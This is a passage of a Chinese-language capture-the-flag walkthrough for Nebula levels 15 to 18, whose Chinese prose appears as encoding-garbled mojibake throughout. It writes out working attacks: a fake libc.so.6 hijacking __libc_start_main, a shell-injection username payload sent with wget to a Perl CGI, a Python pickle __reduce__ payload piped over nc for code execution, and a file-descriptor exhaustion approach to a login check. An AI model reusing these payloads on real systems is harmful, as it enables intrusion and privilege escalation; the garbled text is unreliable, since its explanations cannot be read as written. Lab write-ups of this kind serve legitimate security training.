&lt;pre&gt;&lt;code class="cpp"&gt;__attribute__((constructor)) void init(void) { ... }
__attribute__((destructor))  void fini(void) { ... }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿™æ˜¯GCCç‰¹æœ‰çš„å‡½æ•°ï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸€ä¸ªç›¸å¯¹é€šç”¨çš„è§£å†³æ–¹æ¡ˆï¼Œä½¿ç”¨å†…æ ¸çš„å¯åŠ¨å‡½æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;int __libc_start_main(
    int (*main) (int, char * *, char * *),
    int argc,
    char **ubp_av,
    void (*init) (void),
    void (*fini) (void),
    void (*rtld_fini) (void),
    void(* stack_end)
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;æˆ‘è¿™é‡Œç”¨è¿™ä¸ªå‚æ•°é•¿çš„BTçš„å¯åŠ¨å‡½æ•°æ¥å†™å…±äº«åº“ï¼ˆsystem()å®åˆ™ä¼šfork()ä¸€ä¸ªæ–°è¿›ç¨‹å¹¶exec()æ›¿æ¢è¿›ç¨‹æ‰§è¡Œï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;unistd.h&amp;gt;
int __libc_start_main(
    int (*main) (int, char * *, char * *), int argc,
    char **ubp_av, void (*init) (void), void (*fini) (void),
    void (*rtld_fini) (void), void(* stack_end))
{
    execl(&amp;quot;/bin/getflag&amp;quot;, (char *)NULL, (char *)NULL);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class="bash"&gt;gcc -fPIC -shared -o /var/tmp/flag15/libc.so.6 libc.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯æ˜¯ï¼Œæ‰§è¡Œflag15åæç¤º:&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¸¤ä¸ªé”™è¯¯ï¼Œä¸€ä¸ªæ‰¾ä¸åˆ°ç¬¦å·ï¼Œä¸€ä¸ªç¼ºå°‘GLIBC_2.1.3ç‰ˆæœ¬å®šä¹‰ã€‚Googleåå¾—åˆ°é™æ€é“¾æ¥é…åˆversion scriptçš„æ–¹æ¡ˆï¼Œåˆ›å»ºä¸€ä¸ªversionæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;GLIBC_2.0 {
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åç¼–è¯‘ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o /var/tmp/flag15/libc.so.6 libc.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¦‚æ­¤ï¼Œå³å¯æˆåŠŸè¿è¡Œgetflagã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level16&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a perl script running on port 1616.&lt;/p&gt;
&lt;p&gt;æœ‰ä¸ªperlè„šæœ¬åœ¨1616ç«¯å£è¿è¡Œã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="perl"&gt;#!/usr/bin/env perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/;  # conver to uppercase
  $username =~ s/\s.*//;    # strip everything after a space

  @output = `egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) {
    ($usr, $pw) = split(/:/, $line);


    if($pw =~ $password) { 
      return 1;
    }
  }

  return 0;
}

sub htmlz {
  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;);
  if($_[0] == 1) {
    print(&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;);
  } else {
    print(&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;);
  }  
  print(&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;);
}

htmlz(login(param(&amp;quot;username&amp;quot;), param(&amp;quot;password&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;é¦–å…ˆæ¥çœ‹ä»£ç é€»è¾‘ï¼Œgetä¸¤ä¸ªå‚æ•°usernameå’Œpasswordï¼Œå°†usernameå…¨éƒ¨è½¬æ¢æˆå¤§å†™å¹¶å»æ‰ç©ºæ ¼ï¼Œä¹‹åæ‰§è¡Œegrepå‘½ä»¤ï¼Œå¹¶åŒ¹é…passwordã€‚egrepæ˜¯shellå‘½ä»¤ï¼Œè¿™é‡Œå°±æ˜¯è¿™é“é¢˜çš„çªç ´å£ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼ŒLinuxæ˜¯åŒºåˆ†å¤§å°å†™çš„ç³»ç»Ÿï¼Œæ‰€ä»¥éœ€è¦æƒ³åŠæ³•æ„é€ åç§°ä¸ºå¤§å†™çš„è„šæœ¬å¹¶å®Œæˆæ¼æ´çš„åˆ©ç”¨ã€‚ä¸è¿‡ï¼ŒLinuxçš„æ ¹ç›®å½•æ²¡æœ‰å†™å…¥æƒé™ï¼Œä¸€çº§ç›®å½•ä¹Ÿæ²¡æœ‰å¤§å†™åå­—çš„ç›®å½•ï¼Œè¯¥å¦‚ä½•å¤„ç†ï¼Ÿè¿™é‡Œç”¨åˆ°äº†é€šé…ç¬¦æŠ€å·§ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level16@nebula:~$ touch /tmp/TEST16
level16@nebula:~$ ls /*/TEST16
/tmp/TEST16
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;äºæ˜¯æ„é€ ä¸€ä¸ªè„šæœ¬/tmp/EXP16ï¼Œå¹¶ç»™äºˆxæƒé™ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;#! /bin/bash
/bin/getflag &amp;gt; /tmp/flag16.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¹‹åæ„é€ å‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;username=&amp;quot;&amp;lt;/DEV/NULL;/*/EXP16;#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å…¶ä¸­ç¬¬ä¸€ä¸ª&lt;code&gt;"&lt;/code&gt;ç”¨äºé—­åˆï¼Œ&lt;code&gt;&amp;lt;/DEV/NULL&lt;/code&gt;æ˜¯ç»™egrepçš„è¾“å…¥å‚æ•°ï¼Œä¹‹åæ˜¯æ¼æ´åˆ©ç”¨çš„å‘½ä»¤ï¼Œæœ€åçš„&lt;code&gt;#&lt;/code&gt;ç”¨äºæ³¨é‡Šæ‰åé¢çš„è¯­å¥ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åå°†æ„é€ å¥½çš„å‚æ•°ç¼–ç å¹¶æ‰§è¡Œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://127.0.0.1:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3B%2F%2A%2FEXP%3B%23 -O /dev/null
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä»/tmp/flag16.txtä¸­å¯ä»¥å‘ç°æˆåŠŸgetflagã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level17&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a python script listening on port 10007 that contains a vulnerability.&lt;/p&gt;
&lt;p&gt;åœ¨ç›‘å¬10007ç«¯å£çš„pythonè„šæœ¬æœ‰æ¼æ´ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="python"&gt;#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
    clnt.send(&amp;quot;why did you send me &amp;quot; + i + &amp;quot;?\n&amp;quot;)

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
    clnt.send(&amp;quot;Accepted connection from %s:%d&amp;quot; % (addr[0], addr[1]))
    server(clnt)
    exit(1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pythonå†™çš„ä¸€ä¸ªsocketæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¸€è¿è¡Œå°±å¯¹æ¥æ”¶åˆ°çš„æ•°æ®ç”¨pickleè¿›è¡Œååºåˆ—åŒ–ã€‚åºåˆ—åŒ–/ååºåˆ—åŒ–å°±æ„å‘³å¯¹è±¡å¯ä»¥è¢«å­˜å‚¨ï¼Œå› æ­¤ä¹Ÿæœ‰å¯èƒ½è¢«è¿è¡Œã€‚ç½‘ä¸Šå¯ä»¥æœç´¢ä¸€ä¸‹Pickle Exploitç›¸å…³ä¿¡æ¯ï¼Œå¯è°“ä¸€æŠ“ä¸€å¤§æŠŠã€‚&lt;/p&gt;
&lt;p&gt;è¿™é¢˜æ€è·¯å°±æ˜¯ä»pickleä¸‹æ‰‹ï¼ŒæŸ¥è¯¢äº†Python Manualåå‘ç°ï¼Œdumps()/loads()å‡½æ•°å¯ä»¥åºåˆ—åŒ–è½¬æ¢å¯¹è±¡å’Œbyteã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æœ‰äº†å­˜å‚¨å’Œæ¢å¤å¯¹è±¡çš„æ–¹æ³•ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯å¦‚ä½•è®©å¯¹è±¡å†…çš„æ–¹æ³•è¿è¡Œã€‚phpæœ‰é­”æ•°æ–¹æ³•ï¼Œpythonåº”è¯¥ä¹Ÿæœ‰ã€‚ç»§ç»­çœ‹æ‰‹å†Œä¸­pickleè¿™ç« ï¼Œå‘ç°åœ¨æ¢å¤å¯¹è±¡çš„æ—¶å€™&lt;code&gt;__init__()&lt;/code&gt;å’Œ&lt;code&gt;__new__()&lt;/code&gt;æ˜¯ä¸ä¼šè¢«è°ƒç”¨çš„ï¼Œä½†æ˜¯æœ‰&lt;code&gt;__reduce__()&lt;/code&gt;ï¼Œä¸è¿‡éœ€è¦è¿”å›tupleæˆ–è€…stringã€‚&lt;/p&gt;
&lt;p&gt;äºæ˜¯æ„é€ ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;import pickle
import os

class Exp17(object):
    def __reduce__(self):
        return (os.system, ('/bin/getflag &amp;gt; /tmp/flag17.txt',))

obj = pickle.dumps(Exp17())
# pickle.loads(obj)
print obj
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä¸Šé¢ä»£ç ä¸­æ³¨é‡Šæ‰çš„é‚£å¥æ˜¯æˆ‘ç”¨æ¥æµ‹è¯•çš„ä»£ç ï¼Œæµ‹è¯•æ­£å¸¸åå°±å¯ä»¥å¼€å§‹æ¼æ´åˆ©ç”¨äº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python exp17.py | nc 127.0.0.1 10007
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¿è¡Œä»£ç ï¼Œè®©ncå»ºç«‹è¿æ¥å¹¶å›è½¦ï¼Œä¹‹åCtrl+Cåœæ­¢è¿è¡Œï¼Œå»/tmp/flag17.txtçœ‹æˆæœå§ã€‚&lt;/p&gt;
&lt;h1&gt;Nebula level18&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/p&gt;
&lt;p&gt;åˆ†æCç¨‹åºæ¼æ´ï¼Œè¿™é“é¢˜æœ‰ç®€å•ã€ä¸­ç­‰ã€å›°éš¾ä¸”ä¸å¯é 3ç§æ–¹å¼å»è§£å†³ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE &amp;quot;/home/flag18/password&amp;quot;

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, &amp;quot;r&amp;quot;);
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;    
  }
  dprintf(&amp;quot;logged in successfully (with%s password file)\n&amp;quot;, 
    fp == NULL ? &amp;quot;out&amp;quot; : &amp;quot;&amp;quot;);

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;amp;buffer, &amp;quot;--&amp;gt; [%s] is unsupported at this current time.\n&amp;quot;, what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, &amp;quot;unable to set user to '%s' -- not supported.\n&amp;quot;, user);
  printf(&amp;quot;%s\n&amp;quot;, msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, &amp;quot;d:v&amp;quot;)) != -1) {
    switch(c) {
      case 'd':
        globals.debugfile = fopen(optarg, &amp;quot;w+&amp;quot;);
        if(globals.debugfile == NULL) err(1, &amp;quot;Unable to open %s&amp;quot;, optarg);
        setvbuf(globals.debugfile, NULL, _IONBF, 0);
        break;
      case 'v':
        globals.verbose++;
        break;
    }
  }

  dprintf(&amp;quot;Starting up. Verbose level = %d\n&amp;quot;, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
    char line[256];
    char *p, *q;

    q = fgets(line, sizeof(line)-1, stdin);
    if(q == NULL) break;
    p = strchr(line, '\n'); if(p) *p = 0;
    p = strchr(line, '\r'); if(p) *p = 0;

    dvprintf(2, &amp;quot;got [%s] as input\n&amp;quot;, line);

    if(strncmp(line, &amp;quot;login&amp;quot;, 5) == 0) {
      dvprintf(3, &amp;quot;attempting to login\n&amp;quot;);
      login(line + 6);
    } else if(strncmp(line, &amp;quot;logout&amp;quot;, 6) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, &amp;quot;shell&amp;quot;, 5) == 0) {
      dvprintf(3, &amp;quot;attempting to start shell\n&amp;quot;);
      if(globals.loggedin) {
        execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
        err(1, &amp;quot;unable to execve&amp;quot;);
      }
      dprintf(&amp;quot;Permission denied\n&amp;quot;);
    } else if(strncmp(line, &amp;quot;logout&amp;quot;, 4) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, &amp;quot;closelog&amp;quot;, 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
    } else if(strncmp(line, &amp;quot;site exec&amp;quot;, 9) == 0) {
      notsupported(line + 10);
    } else if(strncmp(line, &amp;quot;setuser&amp;quot;, 7) == 0) {
      setuser(line + 8);
    }
  }

  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;çœ‹åˆ°è¿™æ®µé•¿é•¿çš„Cä»£ç å°±æ„Ÿåˆ°å¿ƒç´¯å•Šï¼Œå…¶å®è¿™æ®µä»£ç çš„æ¡†æ¶æ˜¯æ ‡å‡†çš„Linuxå‘½ä»¤è¡Œç¨‹åºï¼Œæ¨¡æ‹Ÿäº†ä¸€ä¸ªå°å°çš„shellã€‚&lt;/p&gt;
&lt;p&gt;è§£é‡Šä¸€ä¸‹ç¨‹åºå¤§çš„æ¡†æ¶ï¼šç›´æ¥çœ‹mainå‡½æ•°ï¼Œç¨‹åºå¯åŠ¨åé€šè¿‡&lt;code&gt;getopt()&lt;/code&gt;è§£æå‚æ•°ï¼Œå«å‚å‚æ•°då’Œä¸å«å‚å‚æ•°vï¼Œdå‚æ•°åé¢è·Ÿç€çš„å‚æ•°ä¸ºæ–‡ä»¶è·¯å¾„ï¼Œè€Œvåˆ™è®©å…¨å±€ç»“æ„ä½“ä¸­verboseå˜é‡è‡ªå¢ã€‚ä¹‹åè¿›å…¥æ— é™å¾ªç¯ï¼Œä»æ ‡å‡†è¾“å…¥ä¸­è·å–è¾“å…¥ï¼ˆè¦æ±‚\r\nç»“å°¾ï¼‰ï¼Œå¯¹äºè¾“å…¥æ‰§è¡Œç›¸å…³å‡½æ•°æˆ–æ“ä½œã€‚ä¹‹åçœ‹å®å®šä¹‰ï¼šä¸¤ä¸ªå®ç”¨äºè°ƒè¯•è¾“å‡ºï¼Œè€Œå…¨å±€ç»“æ„ä½“ä¸­çš„verboseå°±æ˜¯æŒ‡å®šè°ƒè¯•ç­‰çº§çš„ï¼Œæ‰€æœ‰è°ƒè¯•å†…å®¹ä¼šè¾“å‡ºåˆ°åˆšæ‰då‚æ•°åçš„å‚æ•°æŒ‡å®šçš„è·¯å¾„ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;åæ±‡ç¼–ç¨‹åºåæ‰¾åˆ°ä¸€ä¸ªçªç ´å£åœ¨loginå‡½æ•°ä¸­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0x08048c50 &amp;lt;+0&amp;gt;:    sub    $0x6c,%esp
0x08048c53 &amp;lt;+3&amp;gt;:    mov    %ebx,0x60(%esp)
0x08048c57 &amp;lt;+7&amp;gt;:    mov    %edi,0x68(%esp)
0x08048c5b &amp;lt;+11&amp;gt;:   mov    0x70(%esp),%edi
0x08048c5f &amp;lt;+15&amp;gt;:   mov    %gs:0x14,%eax
0x08048c65 &amp;lt;+21&amp;gt;:   mov    %eax,0x5c(%esp)
0x08048c69 &amp;lt;+25&amp;gt;:   xor    %eax,%eax
0x08048c6b &amp;lt;+27&amp;gt;:   mov    %esi,0x64(%esp)
0x08048c6f &amp;lt;+31&amp;gt;:   movl   $0x8048fba,0x4(%esp)
0x08048c77 &amp;lt;+39&amp;gt;:   movl   $0x8048ef0,(%esp)
0x08048c7e &amp;lt;+46&amp;gt;:   call   0x8048750 &amp;lt;fopen@plt&amp;gt;
0x08048c83 &amp;lt;+51&amp;gt;:   test   %eax,%eax
0x08048c85 &amp;lt;+53&amp;gt;:   mov    %eax,%ebx
0x08048c87 &amp;lt;+55&amp;gt;:   je     0x8048cb5 &amp;lt;login+101&amp;gt;
0x08048c89 &amp;lt;+57&amp;gt;:   lea    0x1c(%esp),%esi
0x08048c8d &amp;lt;+61&amp;gt;:   mov    %eax,0x8(%esp)
0x08048c91 &amp;lt;+65&amp;gt;:   movl   $0x3f,0x4(%esp)
0x08048c99 &amp;lt;+73&amp;gt;:   mov    %esi,(%esp)
0x08048c9c &amp;lt;+76&amp;gt;:   call   0x8048670 &amp;lt;fgets@plt&amp;gt;
0x08048ca1 &amp;lt;+81&amp;gt;:   test   %eax,%eax
0x08048ca3 &amp;lt;+83&amp;gt;:   je     0x8048d18 &amp;lt;login+200&amp;gt;
0x08048ca5 &amp;lt;+85&amp;gt;:   mov    %esi,0x4(%esp)
0x08048ca9 &amp;lt;+89&amp;gt;:   mov    %edi,(%esp)
0x08048cac &amp;lt;+92&amp;gt;:   call   0x8048640 &amp;lt;strcmp@plt&amp;gt;
0x08048cb1 &amp;lt;+97&amp;gt;:   test   %eax,%eax
0x08048cb3 &amp;lt;+99&amp;gt;:   jne    0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048cb5 &amp;lt;+101&amp;gt;:  mov    0x804b0ac,%edx
0x08048cbb &amp;lt;+107&amp;gt;:  test   %edx,%edx
0x08048cbd &amp;lt;+109&amp;gt;:  je     0x8048cea &amp;lt;login+154&amp;gt;
0x08048cbf &amp;lt;+111&amp;gt;:  mov    $0x8048f50,%eax
0x08048cc4 &amp;lt;+116&amp;gt;:  test   %ebx,%ebx
0x08048cc6 &amp;lt;+118&amp;gt;:  mov    $0x8048fa0,%ecx
0x08048ccb &amp;lt;+123&amp;gt;:  cmovne %ecx,%eax
0x08048cce &amp;lt;+126&amp;gt;:  mov    %eax,0xc(%esp)
0x08048cd2 &amp;lt;+130&amp;gt;:  movl   $0x8048fe0,0x8(%esp)
0x08048cda &amp;lt;+138&amp;gt;:  movl   $0x1,0x4(%esp)
0x08048ce2 &amp;lt;+146&amp;gt;:  mov    %edx,(%esp)
0x08048ce5 &amp;lt;+149&amp;gt;:  call   0x8048770 &amp;lt;__fprintf_chk@plt&amp;gt;
0x08048cea &amp;lt;+154&amp;gt;:  movl   $0x1,0x804b0b4
0x08048cf4 &amp;lt;+164&amp;gt;:  mov    0x5c(%esp),%eax
0x08048cf8 &amp;lt;+168&amp;gt;:  xor    %gs:0x14,%eax
0x08048cff &amp;lt;+175&amp;gt;:  jne    0x8048d43 &amp;lt;login+243&amp;gt;
0x08048d01 &amp;lt;+177&amp;gt;:  mov    0x60(%esp),%ebx
0x08048d05 &amp;lt;+181&amp;gt;:  mov    0x64(%esp),%esi
0x08048d09 &amp;lt;+185&amp;gt;:  mov    0x68(%esp),%edi
0x08048d0d &amp;lt;+189&amp;gt;:  add    $0x6c,%esp
0x08048d10 &amp;lt;+192&amp;gt;:  ret    
0x08048d11 &amp;lt;+193&amp;gt;:  lea    0x0(%esi,%eiz,1),%esi
0x08048d18 &amp;lt;+200&amp;gt;:  mov    0x804b0ac,%eax
0x08048d1d &amp;lt;+205&amp;gt;:  test   %eax,%eax
0x08048d1f &amp;lt;+207&amp;gt;:  je     0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048d21 &amp;lt;+209&amp;gt;:  movl   $0x8048ef0,0xc(%esp)
0x08048d29 &amp;lt;+217&amp;gt;:  movl   $0x8048fbc,0x8(%esp)
0x08048d31 &amp;lt;+225&amp;gt;:  movl   $0x1,0x4(%esp)
0x08048d39 &amp;lt;+233&amp;gt;:  mov    %eax,(%esp)
0x08048d3c &amp;lt;+236&amp;gt;:  call   0x8048770 &amp;lt;__fprintf_chk@plt&amp;gt;
0x08048d41 &amp;lt;+241&amp;gt;:  jmp    0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048d43 &amp;lt;+243&amp;gt;:  call   0x8048690 &amp;lt;__stack_chk_fail@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç»“åˆCç¨‹åºä¸€èµ·çœ‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;fp = fopen(PWFILE, &amp;quot;r&amp;quot;);
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;    
  }
  dprintf(&amp;quot;logged in successfully (with%s password file)\n&amp;quot;, 
    fp == NULL ? &amp;quot;out&amp;quot; : &amp;quot;&amp;quot;);

  globals.loggedin = 1;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¦‚æœifåˆ¤æ–­ä¸ºå‡ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠå…¨å±€ç»“æ„ä½“ä¸­çš„ç™»é™†ä¿¡æ¯è®¾ç½®ä¸º1ã€‚æŸ¥é˜…fopenåå¯çŸ¥å½“æ–‡ä»¶æ— æ³•æ‰“å¼€æ—¶ä¼šè¿”å›NULLï¼Œæ‰€ä»¥å¯ä»¥æƒ³åŠæ³•è®©æ–‡ä»¶æ— æ³•æ‰“å¼€ã€‚å’Œåæ±‡ç¼–ç¨‹åºå¯¹æ¯”ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œ&lt;code&gt;fclose(fp)&lt;/code&gt;åœ¨å®é™…ç¨‹åºä¸­å¹¶ä¸å­˜åœ¨ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶å¥æŸ„æ‰“å¼€åå¹¶ä¸å…³é—­ã€‚ç³»ç»Ÿä¸­æ¯ä¸ªè¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„æ˜¯æœ‰é™çš„ï¼Œå½“è¶…å‡ºé™åˆ¶ï¼Œèµ„æºæ¯ç«­ï¼Œå°±ä¼šè¿”å›NULLã€‚å› æ­¤å¯ä»¥æƒ³åŠæ³•è®©å¥æŸ„èµ„æºæ¯ç«­ã€‚&lt;/p&gt;
&lt;p&gt;Linuxç³»ç»Ÿä¸­çš„å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŸ¥çœ‹å½“å‰æ‰“å¼€æ–‡ä»¶å¥æŸ„å’Œæœ€å¤§å¯æ‰“å¼€å¥æŸ„ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;cat /proc/sys/fs/file-nr
cat /proc/sys/fs/file-max
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ä½†æ˜¯ä¸€èˆ¬æ¥è¯´ï¼Œç³»ç»Ÿä¼šå¯¹æ¯ä¸ªç”¨æˆ·çš„è¿›ç¨‹ä½œå‡ºèµ„æºçš„é™åˆ¶ã€‚å¯ä»¥ä½¿ç”¨ulimitæŸ¥çœ‹é™åˆ¶åçš„èµ„æºæƒ…å†µï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ ulimit -Hn
4096
level18@nebula:/home/flag18$ ulimit -Sn
1024
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶å¥æŸ„æ•°é‡ç¡¬é˜ˆå€¼è®¾å®šä¸º4096ï¼Œä½†å¯¹äºå½“å‰ç”¨æˆ·åªæœ‰1024ã€‚æ¢å¥è¯è¯´ï¼Œåˆ›å»º1024ä¸ªæ–‡ä»¶å¥æŸ„åå°±ä¸èƒ½å†åˆ›å»ºäº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ç¨‹åºæœ¬èº«ä¼šå ç”¨å¤šå°‘æ–‡ä»¶å¥æŸ„å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬å¯ä»¥å…ˆåšä¸ªè¯•éªŒï¼Œé¦–å…ˆè¿è¡Œflag18ï¼Œå¹¶è¿›å…¥è°ƒè¯•æ¨¡å¼ï¼Œè°ƒè¯•ç­‰çº§æœ€é«˜ï¼ˆå› ä¸ºæˆ‘ä»¬éœ€è¦è°ƒè¯•ä¿¡æ¯ï¼‰ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level18@nebula:/home/flag18$ ./flag18 -d /tmp/dbg17 -vvv
login level18

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è¾“å…¥&lt;code&gt;login level18&lt;/code&gt;å¹¶å›è½¦ï¼Œæ­¤æ—¶ç†è®ºä¸Šåº”è¯¥æ‰“å¼€äº†1ä¸ªå¯†ç æ–‡ä»¶å’Œ1ä¸ªè°ƒè¯•ä¿¡æ¯æ–‡ä»¶ã€‚ä½†æ˜¯ï¼Œå½“æˆ‘ä»¬åˆ‡æ¢åˆ°TTY2å¹¶é‡‡ç”¨rootç™»é™†åï¼ˆå…·ä½“æ–¹æ³•è§level07ï¼‰ï¼Œä½¿ç”¨lsofæŸ¥çœ‹è¿›ç¨‹å¥æŸ„ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;root@nebula:~# lsof -c flag18
COMMAND   PID   USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
flag18  11848 flag18  cwd    DIR   0,18      100  13132 /home/flag18
flag18  11848 flag18  rtd    DIR   0,18      260   6744 /
flag18  11848 flag18  txt    REG    7,0    12216  12922 /home/flag18/flag18
flag18  11848 flag18  mem    REG    7,0  1544392  44973 /lib/i386-linux-gnu/libc-2.13.so
flag18  11848 flag18  mem    REG    7,0   126152  44978 /lib/i386-linux-gnu/ld-2.13.so
flag18  11848 flag18    0u   CHR  136,0      0t0      3 /dev/pts/0
flag18  11848 flag18    1u   CHR  136,0      0t0      3 /dev/pts/0
flag18  11848 flag18    2u   CHR  136,0      0t0      3 /dev/pts/0
flag18  11848 flag18    3u   REG   0,19       80 362729 /tmp/dbg17
flag18  11848 flag18    4r   REG   0,17       31 344165 /home/flag18/password
&lt;/code&gt;&lt;/pre&gt;

